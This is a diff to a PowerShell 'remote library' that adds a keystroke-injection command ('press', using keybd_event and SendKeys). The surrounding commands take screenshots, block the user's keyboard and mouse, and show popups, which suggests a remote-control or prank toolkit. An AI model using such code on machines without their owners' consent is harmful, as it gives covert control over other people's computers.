@@ -96,6 +96,66 @@ function tts {
     echo "Your wish is my command."
 }
 
+# Command: press - simulates keyboard key presses
+function press {
+    param(
+        [Parameter(ValueFromRemainingArguments = $true)]
+        [string[]]$Keys
+    )
+    if (-not $Keys) { return }
+
+    $text = $Keys -join " "
+    if ($text.ToLower() -match "windows") {
+        if (-not ("Win32.Keyboard" -as [type])) {
+            $Source = @"
+using System.Runtime.InteropServices;
+public class Keyboard {
+    [DllImport("user32.dll")]
+    public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, int dwExtraInfo);
+}
+"@
+            Add-Type -TypeDefinition $Source -Namespace "Win32" -Name "Keyboard"
+        }
+        $KEYEVENTF_KEYUP = 2
+        $VK_LWIN = 0x5B
+        
+        [Win32.Keyboard]::keybd_event($VK_LWIN, 0, 0, 0)
+        foreach ($k in $Keys) {
+            if ($k.ToLower() -ne "windows" -and $k.Length -eq 1) {
+                $vk = [int][char]$k.ToUpper()[0]
+                [Win32.Keyboard]::keybd_event($vk, 0, 0, 0)
+                [Win32.Keyboard]::keybd_event($vk, 0, $KEYEVENTF_KEYUP, 0)
+            }
+        }
+        [Win32.Keyboard]::keybd_event($VK_LWIN, 0, $KEYEVENTF_KEYUP, 0)
+    }
+    else {
+        Add-Type -AssemblyName System.Windows.Forms
+        $mapped = ""
+        foreach ($k in $Keys) {
+            switch ($k.ToLower()) {
+                "enter" { $mapped += "{ENTER}" }
+                "esc" { $mapped += "{ESC}" }
+                "tab" { $mapped += "{TAB}" }
+                "space" { $mapped += " " }
+                "ctrl" { $mapped += "^" }
+                "alt" { $mapped += "%" }
+                "shift" { $mapped += "+" }
+                "up" { $mapped += "{UP}" }
+                "down" { $mapped += "{DOWN}" }
+                "left" { $mapped += "{LEFT}" }
+                "right" { $mapped += "{RIGHT}" }
+                "backspace" { $mapped += "{BACKSPACE}" }
+                default { $mapped += $k }
+            }
+        }
+        if ($mapped) {
+            [System.Windows.Forms.SendKeys]::SendWait($mapped)
+        }
+    }
+    echo "Your wish is my command."
+}
+
 # Help command – list available remote‑library commands
 function hlp {
     $commands = @{
@@ -104,6 +164,7 @@ function hlp {
         "unblock" = "manually unblock keyboard and mouse input"
         "popup"   = "open a message popup"
         "tts"     = "just text to speech twin"
+        "press"   = "simulate typing keys (e.g. press windows d or press enter)"
         "hlp"     = "js shows all the commands"
     }
     Write-Host "Remote Library Commands:`n"
@@ -113,6 +174,6 @@ function hlp {
 }
 
 # Export the command list to a global variable for easy enumeration (optional)
-$global:RemoteLibCommands = @('ss', 'block', 'unblock', 'popup', 'tts', 'hlp')
+$global:RemoteLibCommands = @('ss', 'block', 'unblock', 'popup', 'tts', 'press', 'hlp')
 
 # End of remote_lib.ps1
